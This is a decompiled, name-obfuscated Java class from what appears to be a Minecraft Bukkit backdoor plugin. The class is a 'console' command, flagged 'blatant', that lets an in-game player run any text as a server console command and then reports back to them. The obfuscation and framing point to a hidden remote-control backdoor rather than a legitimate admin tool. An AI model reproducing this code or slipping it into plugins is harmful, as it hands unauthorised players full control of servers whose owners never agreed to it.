/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class ConsoleCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public ConsoleCommand() {
        ConsoleCommand lllllllllllllIlIIIlIllIIIlIlIllI;
    }

    @Override
    public void execute(Core lllllllllllllIlIIIlIllIIIlIIlllI, String lllllllllllllIlIIIlIllIIIlIIllIl, String[] lllllllllllllIlIIIlIllIIIlIIlIlI, Player lllllllllllllIlIIIlIllIIIlIIlIll) {
        if (lllllllllllllIlIIIlIllIIIlIIlIlI.length <= 1) {
            lllllllllllllIlIIIlIllIIIlIIlIll.sendMessage(Settings.USAGE("console <command>"));
        } else {
            StringBuilder lllllllllllllIlIIIlIllIIIlIlIIII = new StringBuilder();
            for (int lllllllllllllIlIIIlIllIIIlIlIIIl = 1; lllllllllllllIlIIIlIllIIIlIlIIIl != lllllllllllllIlIIIlIllIIIlIIlIlI.length; ++lllllllllllllIlIIIlIllIIIlIlIIIl) {
                lllllllllllllIlIIIlIllIIIlIlIIII.append(lllllllllllllIlIIIlIllIIIlIIlIlI[lllllllllllllIlIIIlIllIIIlIlIIIl]).append(" ");
            }
            API.runCMDAsConsole(String.valueOf(lllllllllllllIlIIIlIllIIIlIlIIII));
            lllllllllllllIlIIIlIllIIIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You executed ").append(Settings.RED).append((Object)lllllllllllllIlIIIlIllIIIlIlIIII).append(Settings.WHITE).append(" from the console"))));
        }
    }
}

